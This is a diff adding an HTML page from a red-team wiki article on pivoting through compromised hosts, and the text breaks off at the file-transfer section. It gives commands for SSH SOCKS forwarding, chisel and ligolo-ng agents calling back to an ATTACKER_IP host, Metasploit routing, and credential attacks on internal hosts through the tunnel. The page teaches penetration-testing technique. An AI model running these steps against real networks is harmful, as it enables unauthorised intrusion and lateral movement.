@@ -1,0 +1,1215 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Pivoting | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Pivoting">
+		<meta name="keywords" content="chisel, ligolo-ng, metasploit, pivoting, port-forwarding, proxychains, redteam, socks-proxy, tunnels">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Pivoting">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Using compromised hosts as gateways to reach inaccessible internal networks: SOCKS proxies, SSH dynamic forwarding, chisel, ligolo-ng, Metasploit route pivoting, port scanning through pivots, and multi-hop pivot chains.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/pivoting.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Pivoting">
+		<meta name="twitter:description" itemprop="description" content="Using compromised hosts as gateways to reach inaccessible internal networks: SOCKS proxies, SSH dynamic forwarding, chisel, ligolo-ng, Metasploit route pivoting, port scanning through pivots, and multi-hop pivot chains.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#pivoting-vs-tunneling-vs-port-forwarding">Pivoting vs Tunneling vs Port Forwarding</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-pivoting-model">The Pivoting Model</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#tools-installation-archlinux">Tools Installation (ArchLinux)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#method-1-ssh-dynamic-forward">Method 1 - SSH Dynamic Forward</a></b>
+					<ul>
+						<li><a href="#why-socks-over-ssh-is-limited">Why SOCKS Over SSH is Limited</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#method-2-chisel-reverse-socks">Method 2 - Chisel (Reverse SOCKS)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#method-3-ligolo-ng-tun">Method 3 - Ligolo-ng TUN</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#method-4-metasploit-route-pivoting">Method 4 - Metasploit Route Pivoting</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#multi-hop-double-pivoting">Multi-Hop / Double Pivoting</a></b>
+					<ul>
+						<li><a href="#double-pivot-with-proxychains">Double Pivot with Proxychains</a></li>
+						<li><a href="#double-pivot-with-chisel-chaining">Double Pivot with Chisel (Chaining)</a></li>
+						<li><a href="#double-pivot-with-ligolo-ng-simplest">Double Pivot with Ligolo-ng (Simplest)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#port-scanning-through-a-pivot">Port Scanning Through a Pivot</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#route-management-on-the-attacker">Route Management on the Attacker</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#file-transfer-through-pivots">File Transfer Through Pivots</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#pivoting-tools-comparison">Pivoting Tools Comparison</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes">Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+						<li><a href="#phase-1-compromise-the-pivot-host">Phase 1 - Compromise the Pivot Host</a></li>
+						<li><a href="#phase-2-set-up-the-pivot-with-chisel">Phase 2 - Set Up the Pivot with Chisel</a></li>
+						<li><a href="#phase-3-scan-internal-network">Phase 3 - Scan Internal Network</a></li>
+						<li><a href="#phase-4-internal-services">Phase 4 - Internal Services</a></li>
+						<li><a href="#phase-5-compromise-the-internal-host">Phase 5 - Compromise the Internal Host</a></li>
+						<li><a href="#phase-6-ligolo-ng-walkthrough">Phase 6 - Ligolo-ng Walkthrough</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/pivoting.html">Pivoting</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="pivoting">Pivoting</h2>
+					<p>
+						Using compromised hosts as gateways to reach inaccessible internal networks:
+						<code>SOCKS</code>
+						proxies,
+						<abbr title="Secure Shell">SSH</abbr>
+						dynamic forwarding, chisel, ligolo-ng, Metasploit route pivoting, port scanning
+						through pivots, and multi-hop pivot chains.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							A pivot turns one compromised host into a gateway for every network it can reach. This article
+							separates pivoting from tunneling and port forwarding, then walks through the four common methods:
+							<abbr title="Secure Shell">SSH</abbr>
+							dynamic forwarding, chisel reverse
+							<code>SOCKS</code>
+							, ligolo-ng TUN interfaces, and
+							Metasploit routes. After reading you can route a scan or an exploit through a dual-homed host
+							and chain a second hop to a network the first host cannot see.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/tcp-handshake.html">TCP Handshake</a> - <abbr title="Transmission Control Protocol">TCP</abbr> connections, routing, <code>SYN</code> / <code>SYN-ACK</code> / <code>ACK</code></li>
+							<li><a href="/wiki/articles/fundamentals/dns.html">DNS</a> - <abbr title="Domain Name System">DNS</abbr> resolution, resolvers, nameservers</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="pivoting-vs-tunneling-vs-port-forwarding">Pivoting vs Tunneling vs Port Forwarding</h3>
+						<p>
+							These terms describe fundamentally different mechanisms. Using them correctly matters when communicating
+							with team members and when selecting the right tool.
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Technique</th>
+									<th align="center">Definition</th>
+									<th align="center">OSI Layer</th>
+									<th align="center">Use Case</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><b>Port Forwarding</b></td>
+									<td align="center">Redirecting traffic from one TCP/UDP port to another IP:port pair through an intermediary host. Traffic is forwarded as raw bytes - protocol-agnostic.</td>
+									<td align="center">Layer 4</td>
+									<td align="center">Expose a single service (RDP 3389, SMB 445) from the internal network to your attacker machine.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Tunneling</b></td>
+									<td align="center">Encapsulating one protocol inside another, usually to bypass firewall rules that block the outer protocol. Tunnels create a virtual point-to-point link.</td>
+									<td align="center">Layer 3/4</td>
+									<td align="center">DNS tunneling (iodine), ICMP tunneling (ptunnel), HTTP tunneling (HTTP CONNECT) - for heavily filtered environments where only one protocol is permitted outbound.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Pivoting</b></td>
+									<td align="center">Using a compromised host as a router to forward arbitrary traffic to an otherwise unreachable network. The pivot host routes IP packets or application-level traffic between your attacker machine and the internal network.</td>
+									<td align="center">Layer 3/4/7</td>
+									<td align="center">Full network access through the pivot: port scanning, exploiting services, lateral movement. The pivot is the gateway.</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>This article covers pivoting. Tunneling and port forwarding are separate articles.</p>
+					</section>
+					<section>
+						<h3 id="the-pivoting-model">The Pivoting Model</h3>
+						<pre class="plaintext">
+Attacker (10.20.30.40)                    Compromised Web Server (192.168.1.10)
+    │                                          ├── eth0: 192.168.1.10 (reachable)
+    │  SSH / chisel / ligolo                  │
+    └──────────────────────────────────────────┤
+                                               │
+                                               ├── eth1: 10.0.0.10 (internal NIC)
+                                               │         │
+                                               │         ├── 10.0.0.50 (internal DB server)
+                                               │         ├── 10.0.0.51 (internal SMB server)
+                                               │         └── 10.0.0.1   (internal router/DC)
+						</pre>
+						<p>
+							The compromised host has two network interfaces: one facing the attacker, one facing the internal
+							network. The pivot turns this dual-homed host into a gateway. From the attacker's perspective,
+							packets destined for 10.0.0.0/24 are sent to the pivot, which routes them into the internal
+							network and relays the responses back.
+						</p>
+					</section>
+					<section>
+						<h3 id="tools-installation-archlinux">Tools Installation (ArchLinux)</h3>
+						<pre class="bash">
+sudo pacman -S proxychains-ng nmap openssh bind-tools
+
+# chisel — Go-based TCP/UDP tunnel over HTTP, single binary
+yay -S chisel
+# or: go install github.com/jpillora/chisel@latest
+
+# ligolo-ng — TUN-based pivoting with agent/proxy architecture
+yay -S ligolo-ng
+# or: git clone /opt/ligolo-ng &amp;&amp; cd /opt/ligolo-ng &amp;&amp; make
+
+# netexec (successor to crackmapexec)
+yay -S netexec
+						</pre>
+					</section>
+					<section>
+						<h3 id="method-1-ssh-dynamic-forward">Method 1 - SSH Dynamic Forward</h3>
+						<p>
+							<abbr title="Secure Shell">SSH</abbr>
+							dynamic forwarding creates a
+							<code>SOCKS</code>
+							proxy on a local port. Applications
+							that speak
+							<code>SOCKS</code>
+							(configured via
+							<code>proxychains</code>
+							or native
+							<code>SOCKS</code>
+							support) can route traffic
+							through the
+							<abbr title="Secure Shell">SSH</abbr>
+							tunnel to the remote host's accessible networks.
+						</p>
+						<pre class="bash">
+# On the attacker machine:
+ssh -D 1080 -N -f user@compromised-host-ip
+
+# -D 1080   : Dynamic application-level port forwarding (SOCKS)
+#             Creates a SOCKS proxy on localhost:1080
+# -N        : Do not execute a remote command (just forward)
+# -f        : Fork to background after authentication
+
+# Verify the SOCKS proxy is listening
+ss -tlnp | grep 1080
+# LISTEN 0  128  127.0.0.1:1080  0.0.0.0:*  users:((&#34;ssh&#34;,pid=12345,fd=4))
+
+# Configure proxychains to use the SOCKS proxy
+# Edit /etc/proxychains4.conf:
+						</pre>
+						<pre class="bash">
+# proxychains configuration (/etc/proxychains4.conf)
+cat &lt;&lt; &#39;EOF&#39; | sudo tee /etc/proxychains4.conf
+# proxychains configuration
+strict_chain
+# dynamic_chain — automatically skips dead proxies (less predictable)
+# strict_chain — uses proxies in order, fails if any proxy is dead
+
+# Quiet mode — suppresses verbose output from proxychains
+quiet_mode
+
+# DNS through proxy — proxychains intercepts DNS requests
+# and resolves them through the proxy (prevents DNS leaks)
+proxy_dns
+
+# Local network — avoid routing localhost/private traffic through the proxy
+localnet 127.0.0.0/255.0.0.0
+
+[ProxyList]
+# SOCKS proxy through SSH dynamic forward
+socks4  127.0.0.1 1080
+# socks5 127.0.0.1 1080   # Use SOCKS5 if the SSH server supports it
+EOF
+						</pre>
+						<pre class="bash">
+# Test the SOCKS proxy
+proxychains4 curl -s http://10.0.0.50
+
+# Run nmap through the SOCKS proxy (TCP Connect scan only)
+# SYN scan does not work through SOCKS — SOCKS is TCP only
+proxychains4 nmap -sT -Pn -n -p 22,80,445,3389 10.0.0.50
+
+# -sT : TCP Connect scan (full TCP handshake — SOCKS compatible)
+# -Pn : skip host discovery (assume host is up)
+# -n  : no DNS resolution (proxychains handles DNS)
+
+# Run crackmapexec through the proxy
+proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p &#39;password&#39; -d corp.local
+						</pre>
+						<pre class="bash">
+# SSH dynamic forward with a jump host (Multi-hop pivot)
+# Chain two SSH dynamic forwards:
+# Attacker → Host A (192.168.1.10) → Host B (10.0.0.50)
+
+# Terminal 1 — SSH -D from Attacker to Host A
+ssh -D 1080 -N root@192.168.1.10
+
+# Terminal 2 — SSH -D from Host A to Host B, through the SOCKS proxy
+proxychains4 ssh -D 1081 -N root@10.0.0.50
+
+# Now localhost:1080 routes through Host A; localhost:1081 routes through Host A → Host B.
+# Configure proxychains for the second proxy to reach Host B&#39;s internal network (10.0.0.0/24).
+						</pre>
+						<h4 id="why-socks-over-ssh-is-limited">Why SOCKS Over SSH is Limited</h4>
+						<ul>
+							<li><b>TCP only</b> - No <abbr title="User Datagram Protocol">UDP</abbr> (no <abbr title="Domain Name System">DNS</abbr> resolution through the tunnel without <code>proxy_dns</code> in proxychains, which wraps <abbr title="Domain Name System">DNS</abbr> in <abbr title="Transmission Control Protocol">TCP</abbr> ). No <abbr title="Internet Control Message Protocol">ICMP</abbr> .</li>
+							<li><b>Single TCP connection per stream</b> - nmap Connect scan opens one connection per port. Scanning 1000 ports on one host = 1000 <abbr title="Secure Shell">SSH</abbr> -encrypted <code>SOCKS</code> connections. Slow and noisy.</li>
+							<li><b>No raw socket support</b> - <abbr title="Synchronize">SYN</abbr> scan ( <code>-sS</code> ) requires raw sockets, which <code>SOCKS</code> does not provide. Nmap falls back to Connect scan.</li>
+							<li><b>Latency multiplication</b> - Each <abbr title="Transmission Control Protocol">TCP</abbr> round-trip incurs double the encryption overhead (attacker -> server -> target, then back).</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="method-2-chisel-reverse-socks">Method 2 - Chisel (Reverse SOCKS)</h3>
+						<p>
+							Chisel is a single binary that creates a
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							/
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							tunnel over
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							or
+							<abbr title="Hypertext Transfer Protocol Secure">HTTPS</abbr>
+							. It uses WebSocket framing, making it look like a long-lived
+							<abbr title="Hypertext Transfer Protocol Secure">HTTPS</abbr>
+							connection. The reverse mode is the standard pivoting deployment: the compromised host connects
+							BACK to your attacker machine, and that connection becomes the
+							<code>SOCKS</code>
+							conduit.
+						</p>
+						<p>
+							No open ports on the compromised host. No inbound firewall rules needed. The compromised host
+							initiates ONE outbound
+							<abbr title="Hypertext Transfer Protocol Secure">HTTPS</abbr>
+							connection - indistinguishable
+							from normal web browsing - and that connection carries all your pivoting traffic.
+						</p>
+						<pre class="bash">
+# On the ATTACKER machine (server mode, listening for reverse connections)
+chisel server -p 8080 --reverse --socks5
+
+# -p 8080      : listen port (use 443 for better OPSEC — looks like HTTPS)
+# --reverse    : allow reverse port forwarding from clients
+# --socks5     : enable SOCKS5 proxy on the server side
+#                (clients connect back; the proxy endpoint is on the server)
+
+# Output:
+# [server] Listening on http://0.0.0.0:8080
+						</pre>
+						<pre class="bash">
+# On the COMPROMISED HOST (client mode, connects back to attacker)
+# Upload chisel binary first (single static binary, ~8MB with go build)
+./chisel client ATTACKER_IP:8080 R:socks
+
+# ATTACKER_IP:8080  : attacker&#39;s chisel server address
+# R:socks           : Reverse — create a SOCKS proxy on the SERVER (attacker)
+#                     The compromised host connects back, and the SOCKS endpoint
+#                     opens on the attacker&#39;s machine (localhost:1080 by default)
+
+# Alternative: specify a custom SOCKS port on the attacker
+./chisel client ATTACKER_IP:8080 R:2080:socks
+# SOCKS proxy available on attacker&#39;s localhost:2080
+						</pre>
+						<pre class="bash">
+# On the ATTACKER — use the SOCKS proxy
+proxychains4 nmap -sT -Pn -n -p 22,80,445,3389,1433,3306,5985 10.0.0.50
+proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p password
+proxychains4 psexec.py corp.local/jsmith:password@10.0.0.50
+						</pre>
+						<pre class="bash">
+# Chisel — forward a single port through the reverse tunnel
+# Useful when you need RDP/SSH to a specific internal host via the pivot
+
+# On compromised host:
+./chisel client ATTACKER_IP:8080 R:3389:10.0.0.50:3389
+# R:3389:10.0.0.50:3389
+#    Reverse port forward: port 3389 on ATTACKER → 10.0.0.50:3389
+#    R:ATTACKER_PORT:INTERNAL_IP:INTERNAL_PORT
+
+# Now on the attacker:
+xfreerdp /v:127.0.0.1 /u:jsmith  # connects to 10.0.0.50:3389 through the pivot
+						</pre>
+						<pre class="bash">
+# Chisel — full SOCKS5 with authentication (prevents others from using your proxy)
+# Server:
+chisel server -p 8080 --reverse --socks5 --auth myuser:mypassword
+
+# Client:
+./chisel client --auth myuser:mypassword ATTACKER_IP:8080 R:socks
+
+# proxychains config:
+# socks5 127.0.0.1 1080 myuser mypassword
+						</pre>
+					</section>
+					<section>
+						<h3 id="method-3-ligolo-ng-tun">Method 3 - Ligolo-ng TUN</h3>
+						<p>
+							Ligolo-ng creates a TUN (network tunnel) interface - a virtual network adapter at Layer 3. This
+							means all protocols work through the pivot:
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							,
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							,
+							<abbr title="Internet Control Message Protocol">ICMP</abbr>
+							, raw sockets. Nmap
+							<abbr title="Synchronize">SYN</abbr>
+							scans,
+							<abbr title="Server Message Block">SMB</abbr>
+							enumeration, full
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							stack behavior - everything that a dual-homed
+							router can do, ligolo-ng can do.
+						</p>
+						<p>
+							The architecture: ligolo-ng has two components: -
+							<b>Proxy</b>
+							: Runs on the attacker machine.
+							Creates a TUN interface and routes traffic through agent connections. -
+							<b>Agent</b>
+							: Runs on
+							the compromised host. Connects to the proxy and forwards traffic to/from the internal network.
+						</p>
+						<pre class="bash">
+# Step 1 — On the ATTACKER (setup proxy and TUN interface)
+# Create the TUN interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+# (sudo required to create TUN; runs as the specified user afterward)
+
+# Enable the TUN interface
+sudo ip link set ligolo up
+
+# Assign an IP to the TUN interface — this IP is part of the internal network
+# but does not conflict with any existing host
+sudo ip addr add 10.0.0.99/24 dev ligolo
+
+# Start the ligolo-ng proxy
+ligolo-proxy -selfcert
+
+# -selfcert : auto-generate TLS certificate for agent-proxy encryption
+# The proxy listens on 0.0.0.0:11601 by default (change with -laddr)
+						</pre>
+						<pre class="bash">
+# Step 2 — On the COMPROMISED HOST (connect agent to proxy)
+./ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
+
+# -ignore-cert : accept self-signed TLS certificate (OK in lab/live engagements)
+# The agent establishes a persistent TLS connection to the proxy.
+						</pre>
+						<pre class="bash">
+# Step 3 — Back on the ATTACKER (configure and activate)
+# In the ligolo-ng proxy terminal, select the connected agent session:
+ligolo-ng » session
+# Select the agent (listed by name/hostname)
+# Now in the session context:
+
+# Option A — Add a route to the internal network via the agent
+ligolo-ng » ip route add 10.0.0.0/24
+
+# Option B — Start a tunnel that routes all traffic for specified networks
+ligolo-ng » start
+
+# At this point, the TUN interface (ligolo) routes packets for 10.0.0.0/24
+# through the agent&#39;s TLS connection to the compromised host.
+# All protocols work: TCP, UDP, ICMP.
+						</pre>
+						<pre class="bash">
+# Step 4 — Verify connectivity
+# The attacker&#39;s ligolo TUN interface (10.0.0.99) can now reach the internal network.
+ping 10.0.0.50 -c 2
+# PING 10.0.0.50 (10.0.0.50) 56(84) bytes of data.
+# 64 bytes from 10.0.0.50: icmp_seq=1 ttl=127 time=2.5 ms
+
+# Full nmap scan — SYN scan works because TUN supports raw sockets
+sudo nmap -sS -Pn -p 1-1000 10.0.0.50
+
+# crackmapexec — SMB the internal host directly (no proxychains)
+crackmapexec smb 10.0.0.50 -u jsmith -p &#39;password&#39; -d corp.local
+						</pre>
+						<pre class="bash">
+# Multi-hop with ligolo-ng — chain two agents
+# Attacker → Host A (192.168.1.10) → Host B (10.0.0.50)
+
+# On the attacker:
+#   Host A&#39;s agent connects to proxy
+#   Add route: 10.0.0.0/24 via Host A
+
+# Host A now has ligolo-agent running, connecting back to attacker.
+# On the attacker, there is a listener relay:
+ligolo-ng » listener_add --addr 0.0.0.0:11602 --to 10.0.0.50:11601
+
+# Now upload ligolo-agent to Host B (through the pivot):
+proxychains4 scp ligolo-agent root@10.0.0.50:/tmp/
+
+# On Host B:
+./ligolo-agent -connect 10.0.0.99:11602 -ignore-cert
+# 10.0.0.99 is the attacker&#39;s TUN IP, reachable from Host B through Host A
+
+# Back on attacker:
+ligolo-ng » session  # select Host B&#39;s agent
+ligolo-ng » ip route add 172.16.0.0/24  # a third network behind Host B
+ligolo-ng » start
+						</pre>
+					</section>
+					<section>
+						<h3 id="method-4-metasploit-route-pivoting">Method 4 - Metasploit Route Pivoting</h3>
+						<p>
+							When you have a Meterpreter session on a compromised host, Metasploit can route traffic through
+							that session to reach internal networks. Meterpreter sessions already have a built-in communication
+							channel; the route command tells Metasploit to use that channel as a gateway.
+						</p>
+						<pre class="bash">
+# Start Metasploit
+msfconsole
+
+# Already have a Meterpreter session (session 1) on the pivot host
+# Step 1 — Add a route to the internal network through that session
+route add 10.0.0.0/24 1
+
+# Step 1b — Automatically add routes for all known subnets on the pivot
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 10.0.0.0/24
+run
+
+# Step 2 — Start the SOCKS proxy (for external tools like proxychains)
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+run -j
+# -j : run as a background job
+						</pre>
+						<pre class="bash">
+# Step 3 — Use the Metasploit SOCKS proxy with proxychains
+# /etc/proxychains4.conf:
+# socks5 127.0.0.1 1080
+
+proxychains4 crackmapexec smb 10.0.0.50 -u jsmith -p password
+
+# Step 4 — Use Metasploit modules directly through the route
+# Metasploit modules route through added routes automatically — no proxychains needed
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 10.0.0.50
+set SMBUser jsmith
+set SMBPass password
+set SMBDomain corp.local
+run
+						</pre>
+						<pre class="bash">
+# Metasploit port scanning through the pivot
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.0.0.50
+set PORTS 22,80,445,3389,1433,3306,5985,5986
+run
+						</pre>
+						<p>
+							<b>Limitation</b>
+							: The Metasploit
+							<code>SOCKS</code>
+							proxy is slow for port scanning. Each port probe creates
+							a new route lookup and Meterpreter packet. For fast scanning, prefer ligolo-ng TUN. Use Metasploit
+							routes for exploiting detected services - that part is fast because Metasploit modules route
+							natively.
+						</p>
+					</section>
+					<section>
+						<h3 id="multi-hop-double-pivoting">Multi-Hop / Double Pivoting</h3>
+						<p>
+							When the internal network itself contains a host that can reach a third network, you need double
+							pivoting.
+						</p>
+						<pre class="plaintext">
+Attacker → Host A (192.168.1.10) → Host B (10.0.0.50) → Network C (172.16.0.0/24)
+						</pre>
+						<h4 id="double-pivot-with-proxychains">Double Pivot with Proxychains</h4>
+						<pre class="bash">
+# proxychains supports chaining multiple proxies:
+# /etc/proxychains4.conf
+# [ProxyList]
+# socks5  127.0.0.1 1080  # → Host A
+# socks5  127.0.0.1 1081  # → Host B (reached through 1080)
+
+# Step 1 — SSH -D to Host A
+ssh -D 1080 -N root@192.168.1.10
+
+# Step 2 — SSH -D to Host B through Host A
+proxychains4 ssh -D 1081 -N root@10.0.0.50
+
+# Step 3 — Now localhost:1081 routes Attacker → Host A → Host B → Network C
+proxychains4 nmap -sT -Pn -n 172.16.0.0/24
+						</pre>
+						<h4 id="double-pivot-with-chisel-chaining">Double Pivot with Chisel (Chaining)</h4>
+						<pre class="bash">
+# Host A → Attacker (reverse SOCKS)
+# Attacker-side:
+chisel server -p 8080 --reverse --socks5
+# Host A-side:
+./chisel client ATTACKER_IP:8080 R:1080:socks
+# Now localhost:1080 on attacker is a SOCKS proxy through Host A
+
+# Host B → Attacker (reverse SOCKS, through Host A)
+# Host B connects back to attacker THROUGH Host A:
+# On attacker, expose a chisel server reachable from the internal network
+# via a local forward through the first chisel tunnel:
+# Actually, run a second chisel server and have Host B tunnel through Host A:
+
+# Method: Run chisel server on Host A (reachable by Host B)
+# SSH to Host A through SOCKS:
+proxychains4 ssh root@192.168.1.10
+# On Host A:
+chisel server -p 9090 --reverse --socks5
+# Now Host B connects to Host A:
+./chisel client 10.0.0.10:9090 R:socks
+# (10.0.0.10 is Host A&#39;s internal IP)
+
+# But the second SOCKS endpoint is on Host A, not on the attacker.
+# Port forward it back:
+# On attacker, forward Host A&#39;s SOCKS port to your localhost:
+ssh -L 1081:localhost:1080 -N root@192.168.1.10
+# Now localhost:1081 = Host A&#39;s SOCKS = Host B&#39;s internal routes
+						</pre>
+						<h4 id="double-pivot-with-ligolo-ng-simplest">Double Pivot with Ligolo-ng (Simplest)</h4>
+						<p>
+							Ligolo-ng handles multi-hop natively with listener relay. Already covered above:
+							<code>listener_add</code>
+							on the proxy creates a relay endpoint that the second-hop agent can connect to.
+						</p>
+					</section>
+					<section>
+						<h3 id="port-scanning-through-a-pivot">Port Scanning Through a Pivot</h3>
+						<p>
+							<code>SOCKS</code>
+							proxies limit you to
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							Connect scans. TUN interfaces
+							allow
+							<abbr title="Synchronize">SYN</abbr>
+							scans. The difference in speed is dramatic.
+						</p>
+						<pre class="bash">
+# Through SOCKS (slow — each port is a separate TCP handshake)
+proxychains4 nmap -sT -Pn --top-ports 100 10.0.0.50
+# 100 ports ≈ 5-10 minutes through SOCKS
+
+# Through TUN (fast — raw socket, SYN scan)
+sudo nmap -sS -Pn --top-ports 100 10.0.0.50
+# 100 ports ≈ 5-15 seconds through TUN
+						</pre>
+						<pre class="bash">
+# Port scanning without nmap — bash built-in /dev/tcp
+# Works through SOCKS when proxychains wraps it
+for port in 22 80 445 3389 1433 3306 5985 5986 8080 8443; do
+    timeout 2 bash -c &#34;echo &gt;/dev/tcp/10.0.0.50/$port&#34; 2&gt;/dev/null &amp;&amp; \
+        echo &#34;Port $port: OPEN&#34; || echo &#34;Port $port: closed&#34;
+done
+
+# Python port scanner (supports SOCKS via socks module)
+python3 -c &#34;
+import socket, sys
+target = &#39;10.0.0.50&#39;
+for port in [22, 80, 445, 3389, 1433, 3306, 5985, 5986, 8080, 8443]:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(2)
+    result = s.connect_ex((target, port))
+    if result == 0:
+        print(f&#39;Port {port}: OPEN&#39;)
+    s.close()
+&#34;
+						</pre>
+						<pre class="bash">
+# Fast port scan through SOCKS — use masscan with a custom wrapper
+# masscan does not support SOCKS natively. Alternatives:
+# 1. ligolo-ng TUN (masscan works through TUN natively)
+sudo masscan 10.0.0.0/24 -p445 --rate 10000
+
+# 2. Port scan in parallel with bash + proxychains
+seq 1 254 | xargs -P 20 -I {} bash -c \
+    &#34;timeout 2 bash -c &#39;echo &gt;/dev/tcp/10.0.0.{}/445&#39; 2&gt;/dev/null &amp;&amp; echo &#39;10.0.0.{}:445 OPEN&#39;&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="route-management-on-the-attacker">Route Management on the Attacker</h3>
+						<p>
+							When using TUN-based pivoting, you must tell the Linux kernel which traffic goes through the
+							virtual interface.
+						</p>
+						<pre class="bash">
+# View the routing table
+ip route show
+
+# Traffic to 10.0.0.0/24 goes through ligolo TUN
+# Traffic to 10.0.0.99 (the TUN&#39;s own IP) goes through the TUN
+
+# Add a route for internal network access (only needed if ligolo doesn&#39;t auto-route)
+sudo ip route add 10.0.0.0/24 dev ligolo
+
+# Add a more specific route (host route)
+sudo ip route add 10.0.0.50/32 dev ligolo
+
+# Check which interface a packet to an internal IP would take
+ip route get 10.0.0.50
+# 10.0.0.50 dev ligolo src 10.0.0.99 uid 1000
+
+# Remove routes when done
+sudo ip route del 10.0.0.0/24 dev ligolo
+
+# Remove the TUN interface
+sudo ip link del ligolo
+						</pre>
+						<pre class="bash">
+# Network documentation — always document your pivot routes
+# Save a network topology diagram for your engagement notes:
+
+cat &lt;&lt; &#39;EOF&#39; &gt;&gt; engagement_notes.md
+## Pivot Topology
+
+### Hop 1: Web Server (192.168.1.10)
+- Compromised via: SSH creds (root:password123)
+- Internal NIC: 10.0.0.10/24 (eth1)
+- Pivot tool: chisel reverse SOCKS on port 1080
+- Accessible networks: 10.0.0.0/24
+
+### Hop 2: Internal DB Server (10.0.0.50)
+- Compromised via: SMB PtH (administrator hash from secretsdump)
+- Internal NIC 2: 172.16.0.50/24
+- Pivot tool: SSH dynamic forward on port 1081 (reached through proxychains)
+- Accessible networks: 172.16.0.0/24
+
+### Active Routes:
+- localhost:1080 → 10.0.0.0/24 (through 192.168.1.10)
+- localhost:1081 → 172.16.0.0/24 (through 10.0.0.50, via 1080)
+EOF
+						</pre>
+					</section>
+					<section>
+						<h3 id="file-transfer-through-pivots">File Transfer Through Pivots</h3>
+						<pre class="bash">
+# SCP through an SSH proxy
+# Using ProxyCommand:
